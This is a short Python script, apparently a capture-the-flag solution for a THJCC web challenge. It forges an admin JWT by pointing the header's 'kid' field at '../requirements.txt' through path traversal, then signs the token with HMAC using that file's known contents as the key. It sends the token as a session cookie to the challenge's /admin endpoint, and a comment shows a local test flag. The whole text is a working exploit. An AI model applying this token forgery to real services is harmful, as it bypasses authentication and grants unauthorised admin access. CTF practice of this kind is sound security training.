import base64
import hashlib
import hmac
import json
import requests

BASE = "http://chal.thjcc.org:31231"

def b64url(d: bytes) -> str:
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

key = b'Flask==3.0.3\ngunicorn==22.0.0\n'
print(f"key: {key.decode()}")

def jwt_sign(payload: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT", "kid": "../requirements.txt"}
    seg = b64url(json.dumps(header, separators=(",", ":")).encode()) + "." + \
          b64url(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(key, seg.encode(), hashlib.sha256).digest()
    return seg + "." + b64url(sig)

payload = {"username": "aaa", "role": "admin"}

jwt = jwt_sign(payload)
print(f"jwt: {jwt}")

r = requests.get(BASE + "/admin", cookies={"session": jwt})
print(r.text) # THJCC{local_test_flag_not_the_real_one}
